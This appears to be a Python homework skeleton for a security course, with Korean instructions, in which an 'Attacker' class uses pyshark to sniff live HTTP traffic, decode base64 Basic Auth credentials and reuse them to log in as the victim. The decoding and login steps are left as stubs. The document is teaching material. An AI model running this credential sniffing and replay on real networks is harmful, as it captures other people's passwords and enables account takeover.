import pyshark
import requests
import base64
from socket_connection_homework import socket_connect

""" 
pip install pyshark

HTTP Protocol
1. HTTP Get
2. HTTP Authentication/Header
3. Sniff
4. Base 64 encoding/decoding

=============================

1. User 가 login_url 에 로그인 by login.py
2. 로그인에는 user name 과 password 가 필요
	2-1. 이때, username:password 는 base64 로 encoding 되어 있다.
3. Attacker 는 user 가 로그인을 시도할 때, sniffing 을 통해 정보 가져오기
4. user 의 decoded username & password 와 HTTP protocol version, host name 을 출력
5. 동시에, Packet 에 담겨져 있는 username 과 password 를 이용해 login_url 에 로그인

=============================

최종적으로 필요한 것들, (code + image)

1. decoded user info
2. HTTP protocol version
3. Host name
4. response from login_url and log in success

=============================
* pass 를 Packet 에 적혀있는 정보를 통해 작성하되, 
self.decoded_info 는 base64 를 사용하여 decoding 해야 하고, attacker 로 로그인할 때에는 socket_connection.py 를 사용해야 합니다.
"""

class Attacker():
    
    def __init__(self):
        
        self.encoded_info = "" 
        self.decoded_info = "" # use base64
        self.http_version = ""
        self.login_url = ""
        self.host_name = ""
        
        self.protocol = 'http'
    
    def setting(self):
        self.http_packet_count = 0 
        self.capture = pyshark.LiveCapture(interface='eno1', bpf_filter='tcp port 80 or tcp port 443')
        self.capture.apply_on_packets(self.packet_handler)
    
    def packet_handler(self, pkt):
        if self.protocol in pkt:

            print("\n",pkt.http)
            self.http_packet_count += 1
            
            if self.http_packet_count == 2:
                self.print_user_info()
                self.attack()
                self.protocol = 'exit'

    def attack(self):
        socket_connect()
            
    def print_user_info(self):
        print(f"Decoded user info: {self.decoded_info}")
        print(f"HTTP version: {self.http_version}")
        print(f"Host name: {self.host_name}")

            
if __name__ == '__main__':       

    attacker = Attacker()
   
    attacker.setting()
 
